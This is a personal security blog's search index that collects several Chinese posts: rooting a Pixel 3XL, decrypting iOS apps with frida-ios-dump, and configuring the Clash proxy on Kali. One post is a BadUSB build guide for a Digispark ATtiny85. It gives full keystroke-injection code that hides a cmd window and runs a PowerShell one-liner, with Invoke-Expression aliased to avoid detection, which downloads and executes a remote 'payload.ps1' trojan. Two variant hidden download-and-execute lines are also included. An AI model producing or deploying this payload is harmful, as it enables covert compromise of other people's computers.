<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Android刷机流程</title>
    <url>/2023/04/23/Android%E5%88%B7%E6%9C%BA%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<p>才想起来要把这件事写下来，好久之前就答应人家写下来的。</p>
<blockquote>
<p>买了个谷歌龟儿子pixel 3XL用来做app渗透测试，期间给手机进行root的过程耗费了好多事情</p>
</blockquote>
<p>手机：pixel 3XL<br>电脑：这个随意，windows、linux、mac都能操作</p>
<p>已知的刷机路线有两个：</p>
<ol>
<li>刷入原生Android ，安装一个第三方系统，比如lineageOS，再刷TWRP</li>
<li>刷入原生Android12.，刷入pixeldust，安装KernelSU，</li>
</ol>
<p>我个人选择的是第一个办法<br>手机用谷歌pixel 3XL，刷入原生安卓11+第三方lineageOS，再刷入面具来实现root。</p>
<h3 id="刷机："><a href="#刷机：" class="headerlink" title="刷机："></a>刷机：</h3><p>首先打开手机的开发者选项，<br>设置-&gt;系统-&gt;关于手机-&gt;多次点击“版本号”，直到显示“已处于开发者模式”</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306160444.9m0oq1pi7ac.webp"
                      alt="Pasted image 20230306160444" 
                ><figcaption>Pasted image 20230306160444</figcaption></figure>

<p>返回上一级，找到“开发者选项“-&gt;USB调试</p>
<p>插上usb线后，会显示”允许USB调试吗？“<br>此后每次运行命令 adb devices<br>都会出现该弹框</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306145705.2265vt2xb0w0.webp"
                      alt="Pasted image 20230306145705" 
                ><figcaption>Pasted image 20230306145705</figcaption></figure>

<p>开发者选项中，还有一项OEM解锁，这项务必选中，否则后面的刷机不会成功。</p>
<p>接下来是下载对应的官方镜像包<br><a class="link"   href="https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn#source-code-tags-and-builds" >https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn#source-code-tags-and-builds <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>找到手机适用的镜像版本，记录下来，找到镜像，下载</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306150338.6bu5zvyckss0.webp"
                      alt="Pasted image 20230306150338" 
                ><figcaption>Pasted image 20230306150338</figcaption></figure>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207170145.3gnt4ecijr60.webp"
                      alt="Pasted image 20230207170145" 
                ><figcaption>Pasted image 20230207170145</figcaption></figure>

<p>接下来只要解压zip文件，找到压缩包中的flash-all.sh这个线刷脚本直接运行就好了，该脚本会自动完成系统的安装</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306150646.44f2f7hbt2s0.webp"
                      alt="Pasted image 20230306150646" 
                ><figcaption>Pasted image 20230306150646</figcaption></figure>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306150634.4jil6tei1je0.webp"
                      alt="Pasted image 20230306150634" 
                ><figcaption>Pasted image 20230306150634</figcaption></figure>

<p>刷好后，我们获得一台崭新的手机（系统层面），稍微设置一下初始设定，打开wifi，并重新开启开发者模式和usb调试。</p>
<h3 id="第三方系统刷入"><a href="#第三方系统刷入" class="headerlink" title="第三方系统刷入"></a>第三方系统刷入</h3><p>此时要注意，我们不得不选择一款第三方系统进行刷入<br>由twrp的描述得知，想要在pixel 3XL中刷入twrp，必须先刷入一个第三方系统，之后才能完成twrp的刷入，而twrp的刷入，是root不可缺少的一环。</p>
<p>这里我选择的是LineageOS</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207164545.4f2dyel4zsa0.webp"
                      alt="Pasted image 20230207164545" 
                ><figcaption>Pasted image 20230207164545</figcaption></figure>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207164559.uf4snjq46yo.webp"
                      alt="Pasted image 20230207164559" 
                ><figcaption>Pasted image 20230207164559</figcaption></figure>

<p>同样的，要根据手机型号和当前刷入的系统版本来确定LineageOS的版本。<br>刷入流程与官方系统的刷入流程类似，LineageOS官方的指导中也介绍了系统的安装流程，此处不赘述。</p>
<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>TWRP刷入<br>Team Win Recovery Project，一个开源软件定制recovery映像，主要是用来刷root的，当然也可以用来干别的，比如可以刷kali系统，等我以后会有机会买到合适的机型。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207164753.1wdwu17q4gg0.webp"
                      alt="Pasted image 20230207164753" 
                ><figcaption>Pasted image 20230207164753</figcaption></figure><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207171229.63diok6bpdc0.webp"
                      alt="Pasted image 20230207171229" 
                ><figcaption>Pasted image 20230207171229</figcaption></figure></p>
<p>这里要注意的是，选择映像，要多根据版本多试几个，还要搞懂当前手机是欧版（欧洲卖的）还是美版（美国卖的）</p>
<p>进入bootloader界面，使用fastboot将相应的twrp刷入，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br><span class="line">fastboot recovery twrp-3.5.2_10-0-crosshatch.img</span><br></pre></td></tr></table></figure></div>

<p>进入twrp界面，通过音量键向上或者向下，找到recovery mode，点击电源键确认，即可进入twrp<br>使用adb，将root工具推入手机中的&#x2F;sdcard目录下，root工具到github上找Magisk，就是大名鼎鼎的面具。</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306153047.29go2c04i5wk.webp"
                      alt="Pasted image 20230306153047" 
                ><figcaption>Pasted image 20230306153047</figcaption></figure>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push Magisk-v25.2.zip</span><br></pre></td></tr></table></figure></div>
<p>面具官网中也有比较详细的安装流程，与我介绍的不一样，可以参考。<a class="link"   href="https://topjohnwu.github.io/Magisk/install.html" >https://topjohnwu.github.io/Magisk/install.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在TWRP的界面中，选择install，到面具所在的目录中找到Magicsk-v25.2.zip。<br>点击Install Image，静静等待，代码滚动，直到done的出现<br>然后Reboot System</p>
<p>此时打开手机，app列表中会有一个面具app，使用adb进行连接，输入adb shell，再输入su，会提示root申请，允许，root权限获取。</p>
<h3 id="另一种办法"><a href="#另一种办法" class="headerlink" title="另一种办法"></a>另一种办法</h3><p>这个办法我没尝试过，这种办法适用于Android12及以后的系统，具体原因如下：</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207170444.6ho6geqz490.webp"
                      alt="Pasted image 20230207170444" 
                ><figcaption>Pasted image 20230207170444</figcaption></figure>


<p>应对这种情况，就要使用KernelSU为中心的root解决方案<br>安装步骤比上一种简单很多，但我已经root成功了，也不想尝试Android12系统，故方法留给有缘人。</p>
<p>pixeldust<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207163923.7df9bkfpbkk0.webp"
                      alt="Pasted image 20230207163923" 
                ><figcaption>Pasted image 20230207163923</figcaption></figure><br> KernelSU<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230207164856.rd1teg95uf4.webp"
                      alt="Pasted image 20230207164856" 
                ><figcaption>Pasted image 20230207164856</figcaption></figure></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>总的来说，安卓刷机root是一个很麻烦又不得不进行的流程，为了以后安卓渗透和逆向的大业。我们不得不这么吐了血的折腾一次。<br>那么有没有办法让我们把用在刷机的精力节省下来呢？</p>
<p>有！</p>
<p>这位帅比大神专注于谷歌手机的刷机与root<br>并能够提供大量的pixel各种型号的手机<br>你可以直接在他这里买到root好的pixel手机<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306154731.5x7dtv91n5w0.webp"
                      alt="Pasted image 20230306154731" 
                ><figcaption>Pasted image 20230306154731</figcaption></figure><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/Android_root/Pasted image 20230306154745.dw0lquwo76g.webp"
                      alt="Pasted image 20230306154745" 
                ><figcaption>Pasted image 20230306154745</figcaption></figure><br>他的微信二维码就留在这里了，加他，叫我白天的名字有彩蛋。</p>
<p>P.S.我的pixel 3XL在他这里买的，当年买的9成新二手，三百多</p>
<p>竟然还能跑原神</p>
]]></content>
  </entry>
  <entry>
    <title>BadUSB制作过程-基于Digispark</title>
    <url>/2023/04/23/BadUSB%E5%88%B6%E4%BD%9C%E8%BF%87%E7%A8%8B-%E5%9F%BA%E4%BA%8EDigispark/</url>
    <content><![CDATA[<blockquote>
<p>一直就很想做一个BadUSB于是就做了一个BadUSB……</p>
</blockquote>
<h1 id="基于Attiny85和digispark"><a href="#基于Attiny85和digispark" class="headerlink" title="基于Attiny85和digispark"></a>基于Attiny85和digispark</h1><h2 id="首先是原料，上链接："><a href="#首先是原料，上链接：" class="headerlink" title="首先是原料，上链接："></a>首先是原料，上链接：</h2><p>硬件：<br>Attiny85：<a class="link"   href="https://m.tb.cn/h.fg5Xm3W?sm=0be9e8" >https://m.tb.cn/h.fg5Xm3W?sm=0be9e8 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>软件：<br>IDE：<a class="link"   href="https://www.arduino.cc/en/software" >https://www.arduino.cc/en/software <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>驱动：<a class="link"   href="https://github.com/digistump/DigistumpArduino/releases" >https://github.com/digistump/DigistumpArduino/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>指令转译：<a class="link"   href="https://github.com/Catboy96/Automator" >https://github.com/Catboy96/Automator <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="开发板编程环境部署"><a href="#开发板编程环境部署" class="headerlink" title="开发板编程环境部署"></a>开发板编程环境部署</h2><p>首先是下载驱动和arduino，并安装  </p>
<p>点击File-&gt;Preferences,在最下面的输入栏里填写开发板管理的链接</p>
<p><a class="link"   href="http://digistump.com/package_digistump_index.json" >http://digistump.com/package_digistump_index.json <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  </p>
<p>点击 Tools-&gt;Board-&gt;Boards Manager<br>然后在搜索栏里输入digistump，不用写完整自动找到，下载第一个  </p>
<p>下载结束后，在上方栏选择开发板，找到Digispark（Default-16.5mhz）  </p>
<p>之后就是编程环节了<br>这里的逻辑是：仿HID，打开cmd-&gt;输入命令下载木马并使用powershell执行-&gt;关闭窗口  </p>
<p>不同的大佬使用的不同的代码来隐藏窗口运行powershell<br>比如雷神众测的文章用的是</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Powershell IEX(New-Object Net.WebClient).DownloadString(&#x27;http://IP:port/sys_dll.ps1&#x27;);</span><br></pre></td></tr></table></figure></div>


<p>也有大佬使用</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://服务器ip:8000/生成的后门&#x27;);</span><br></pre></td></tr></table></figure></div>


<p>各有春秋</p>
<p>我用的是</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://ip:port/payload.ps1&#x27;) | powershell -&quot;);</span><br></pre></td></tr></table></figure></div>

<p>哪个好用就由后来人说吧，反正目的都是一样的。</p>
<p>附上代码</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;DigiKeyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">   <span class="comment">// put your setup code here, to run once:  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);<span class="comment">//为等待2秒  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_R, MOD_GUI_LEFT);<span class="comment">//发送win+R  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">800</span>);  </span><br><span class="line">   DigiKeyboard.<span class="built_in">println</span>(<span class="string">&quot;cmd /T:01 /K mode CON: COLS=16 LINES=1&quot;</span>);<span class="comment">//将cmd窗口最小化保证隐蔽性  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);  </span><br><span class="line">   DigiKeyboard.<span class="built_in">println</span>(<span class="string">&quot;echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://ip:port/payload.ps1&#x27;) | powershell -&quot;</span>);<span class="comment">//要执行的payload  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">3500</span>); </span><br><span class="line">   DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_F4, MOD_ALT_LEFT);<span class="comment">//执行完成后alt+F4关闭窗口</span></span><br><span class="line">   &#125; </span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="comment">// put your main code here, to run repeatedly: </span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>关于有的大佬说使用Automator这个工具方便键入命令，个人感觉吧，不好用，如不认真学习HID的协议  </p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/content/badusb/image-80ffa4e019054a95bbabaf6e906263b7.41i3rn34x620.webp"
                      alt="image-80ffa4e019054a95bbabaf6e906263b7"
                ><figcaption>image-80ffa4e019054a95bbabaf6e906263b7</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/content/badusb/image-2412be2afe5742629538262be0d454d7.2immd9he0i00.webp"
                      alt="image-2412be2afe5742629538262be0d454d7"
                ><figcaption>image-2412be2afe5742629538262be0d454d7</figcaption></figure></p>
<h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h2><p>中英文切换与大小写，&lt;DigiKeyboard.h&gt;中似乎没有CapsLocks</p>
<p>在github上发现有大佬回答使用57来完成大小写切换，在windows上不区分大小写，所以换用大写后可以避免中文输入法带来的困扰。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">DigiKeyboard.<span class="built_in">sendKeyStroke</span>(<span class="number">57</span>);</span><br></pre></td></tr></table></figure></div>

<p>也有大佬提出，使用ctrl+space来切换输入法</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_SPACE, MOD_CONTROL_LEFT);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>参考<br><a class="link"   href="https://www.cnblogs.com/qianxiao996/p/13574566.html" >https://www.cnblogs.com/qianxiao996/p/13574566.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://mp.weixin.qq.com/s/A8KaMP-AJsuZSyyR6Zs1UA" >https://mp.weixin.qq.com/s/A8KaMP-AJsuZSyyR6Zs1UA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>ipa从获取到砸壳</title>
    <url>/2023/04/23/ipa%E4%BB%8E%E8%8E%B7%E5%8F%96%E5%88%B0%E7%A0%B8%E5%A3%B3/</url>
    <content><![CDATA[<p>一台mac，一部越了狱的iphone<br>Mac mini m1<br>iphone8  iOS1 3.7</p>
<h3 id="获取ipa"><a href="#获取ipa" class="headerlink" title="获取ipa"></a>获取ipa</h3><p>apple configurator 2获取ipa<br>注意<br>～&#x2F;Library&#x2F;Group Containers&#x2F;K36BKF7T3D.group.com.apple.configurator&#x2F;Library&#x2F;Caches&#x2F;Assets<br>这个文件夹下的内容</p>
<p>只要这个目录出现TemporaryItems,那就代表ipa包下载完成了,立马复制粘贴这个文件.当然也可以进去找到ipa包复制出来.还是那句话,手速快网差还没下载完没有目录,网快手速慢等你去找目录,或者复制文件的时候,同步安装已经完成.临时目录就会被删除找不到ipa包</p>
<h3 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h3><p>pc端和手机端分别安装frida<br>这一块不在这里教<br>开俩terminal，一个跑frida，另一个ssh到iphone</p>
<p>从github下载工程：一般情况使用最新的版本，master分支对应Python2，3.x对应Python3版本。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/AloneMonkey/frida-ios-dump </span><br></pre></td></tr></table></figure></div>

<p>安装依赖：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd frida-ios-dump</span><br><span class="line">sudo pip3 install -r requirements.txt --upgrade</span><br></pre></td></tr></table></figure></div>

<p>修改dump.py参数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim frida-ios-dump/dump.py</span><br></pre></td></tr></table></figure></div>

<p>找到如下几行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">User = &#x27;root&#x27;   </span><br><span class="line">Password = &#x27;xxxxxxxxxx&#x27;   </span><br><span class="line">Host = &#x27;localhost&#x27;   </span><br><span class="line">Port = 2222   </span><br></pre></td></tr></table></figure></div>

<p>修改Password和端口号。和iproxy命令端口号保持一致。</p>
<p>列举出安装的应用的名字和bundle id</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd frida-ios-dump</span><br><span class="line">python3 dump.py -l</span><br></pre></td></tr></table></figure></div>

<ul>
<li>执行dump命令</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dump.py id</span><br></pre></td></tr></table></figure></div>

<p>这里的id是com.apple.xxxxxx这样的</p>
<p>砸完壳的ipa在frida-ios-dump文件夹下</p>
]]></content>
  </entry>
  <entry>
    <title>kali安装clash</title>
    <url>/2023/04/23/kali%E5%AE%89%E8%A3%85clash/</url>
    <content><![CDATA[<blockquote>
<p>直接解决掉kali科学上网的全部</p>
</blockquote>
<h2 id="下载clash"><a href="#下载clash" class="headerlink" title="下载clash"></a>下载clash</h2><p>clash：<a class="link"   href="https://github.com/Dreamacro/clash/releases" >https://github.com/Dreamacro/clash/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>下载后安装并修改权限</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x clash</span><br></pre></td></tr></table></figure></div>



<p>先启动一下clash，让clash自动下载和生成必需文件</p>
<p>配置文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/.config/clash</span><br></pre></td></tr></table></figure></div>



<p>删除配置文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf config.yaml</span><br></pre></td></tr></table></figure></div>



<p>下载配置文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget  [链接]</span><br></pre></td></tr></table></figure></div>



<p>从机场下载yaml文件</p>
<p>并放在&#x2F;root&#x2F;.config&#x2F;clash目录下<br>clash的配置文件在~&#x2F;.config&#x2F;clash&#x2F;config.yaml  </p>
<p>修改外部控制设置（external-controller）地址为：0.0.0.0:9890，使内外网都可以访问这个地址</p>
<p>clash图像化配置地址：<a class="link"   href="http://clash.razord.top/" >http://clash.razord.top/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="设置系统代理"><a href="#设置系统代理" class="headerlink" title="设置系统代理"></a>设置系统代理</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/environment</span><br></pre></td></tr></table></figure></div>



<p>填写：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br><span class="line"><span class="built_in">export</span> no_proxy=<span class="string">&quot;localhost, 127.0.0.1&quot;</span></span><br></pre></td></tr></table></figure></div>



<p>修改sudo文件</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure></div>



<p>在文件中填入</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Defaults env_keep+=<span class="string">&quot;http_proxy https_proxy no_proxy&quot;</span></span><br></pre></td></tr></table></figure></div>



<p>重启</p>
<h2 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a>设置开机启动</h2><p>将配置文件移动到etc</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> ~/.config/clash /etc</span><br></pre></td></tr></table></figure></div>



<p>添加启动信息</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/systemd/system/clash.service</span><br></pre></td></tr></table></figure></div>



<p>填入</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=clash daemon</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=root</span><br><span class="line">ExecStart=/opt/clash/clash -d /etc/clash/</span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></div>



<p>这里要注意配置文件的路径<br>即第7行的内容，clash -d 是指定配置文件的路径</p>
<p>重新加载systemctl daemon</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure></div>



<p>启动clash</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start clash.service</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>设置开机启动clash</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> clash.service</span><br></pre></td></tr></table></figure></div>



<p>重启clash</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart clash.service</span><br></pre></td></tr></table></figure></div>



<p>查看clash运行状态</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status clash.service</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<h2 id="定期更新订阅"><a href="#定期更新订阅" class="headerlink" title="定期更新订阅"></a>定期更新订阅</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置clash路径</span></span><br><span class="line">clash_path=<span class="string">&quot;/opt/clash&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止clash</span></span><br><span class="line">systemctl stop clash.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消代理</span></span><br><span class="line"><span class="built_in">unset</span> https_proxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果配置文件存在，备份后下载，如果不存在，直接下载</span></span><br><span class="line"><span class="keyword">if</span> [ -e <span class="variable">$clash_path</span>/config.yaml ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">mv</span> <span class="variable">$clash_path</span>/config.yaml <span class="variable">$clash_path</span>/configbackup.yaml</span><br><span class="line">	wget -O <span class="variable">$clash_path</span>/config.yaml <span class="string">&quot;[你的订阅链接]&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	wget -O <span class="variable">$clash_path</span>/config.yaml <span class="string">&quot;[你的订阅链接]&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启clash</span></span><br><span class="line">systemctl restart clash.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重设代理</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br></pre></td></tr></table></figure></div>



<p>设置定时任务：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure></div>


<p>填写：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">30 4 1,15 * * sh [脚本目录]/[脚本名称]</span><br></pre></td></tr></table></figure></div>



<p>重启crontab</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart cron.service</span><br></pre></td></tr></table></figure></div>



<p>搞定！</p>
]]></content>
  </entry>
  <entry>
    <title>关于Win+Linux双系统 我实现了一个解决方案</title>
    <url>/2023/04/23/%E5%85%B3%E4%BA%8EWin-Linux%E5%8F%8C%E7%B3%BB%E7%BB%9F-%E6%88%91%E5%AE%9E%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<blockquote>
<p>前情提要：<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/image 1.dc4kno2gir4.webp"
                      alt="image 1" 
                ><figcaption>image 1</figcaption></figure></p>
</blockquote>
<blockquote>
<p>之前完成了便携的kali系统，即，将kali安装在移动硬盘中，想要使用的话，只需要插上后重启即可。<br>某一天发现启动出问题了，故该文章重新编写，把截图全都补上。</p>
</blockquote>
<p>那么，正文开始</p>
<h1 id="买"><a href="#买" class="headerlink" title="买"></a>买</h1><p>这里我们期待的一个环境，就是将linux系统安装在移动硬盘里，做到即插即用。<br>先买一个差不多大的硬盘，这里建议买带硬盘盒的，窄长一小条，方便携带。</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/image-1668069178564.hjd8m970em0.webp"
                      alt="image-1668069178564" 
                ><figcaption>image-1668069178564</figcaption></figure>

<p>之后选一个差不多的U盘作为安装启动盘，这里用不着买太大的，差不多就行。</p>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>我们需要一个能将镜像文件存放的安装介质，即把iso放进u盘的工具</p>
<p>Rufus:<a class="link"   href="https://github.com/pbatard/rufus/releases/tag/v3.20" >https://github.com/pbatard/rufus/releases/tag/v3.20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
